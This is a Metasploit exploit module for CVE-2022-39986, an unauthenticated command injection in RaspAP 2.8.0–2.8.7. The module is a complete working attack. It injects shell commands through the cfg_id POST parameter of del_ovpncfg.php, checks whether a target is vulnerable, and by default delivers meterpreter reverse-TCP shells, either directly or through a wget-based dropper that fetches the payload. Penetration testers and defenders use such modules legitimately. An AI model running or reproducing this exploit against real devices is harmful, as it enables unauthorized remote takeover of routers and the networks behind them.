##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'RaspAP Unauthenticated Command Injection',
        'Description' => %q{
          RaspAP is feature-rich wireless router software that just works
          on many popular Debian-based devices, including the Raspberry Pi.
          A Command Injection vulnerability in RaspAP versions 2.8.0 thru 2.8.7 allows
          unauthenticated attackers to execute arbitrary commands in the context of the user running RaspAP via the cfg_id
          parameter in /ajax/openvpn/activate_ovpncfg.php and /ajax/openvpn/del_ovpncfg.php.
 
          Successfully tested against RaspAP 2.8.0 and 2.8.7.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Ege BALCI <egebalci[at]pm.me>', # msf module
          'Ismael0x00', # original PoC, analysis
        ],
        'References' => [
          ['CVE', '2022-39986'],
          ['URL', 'https://medium.com/@ismael0x00/multiple-vulnerabilities-in-raspap-3c35e78809f2'],
          ['URL', 'https://github.com/advisories/GHSA-7c28-wg7r-pg6f']
        ],
        'Platform' => ['unix', 'linux'],
        'Privileged' => false,
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => :wget,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DisclosureDate' => '2023-07-31',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of the RaspAP Web GUI', '/'])
      ]
    )
  end
 
  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'ajax', 'openvpn', 'del_ovpncfg.php'),
      'method' => 'POST'
    )
    return CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
 
    if res.code == 200
      return CheckCode::Appears
    end
 
    CheckCode::Safe
  end
 
  def execute_command(cmd, _opts = {})
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'ajax', 'openvpn', 'del_ovpncfg.php'),
      'method' => 'POST',
      'vars_post' => {
        'cfg_id' => ";#{cmd};#"
      }
    )
  end
 
  def exploit
    case target['Type']
    when :unix_cmd
      print_status("Executing #{target.name} with #{payload.encoded}")
      execute_command(payload.encoded)
    when :linux_dropper
      print_status("Executing #{target.name}")
      execute_cmdstager
    end
  end
end
 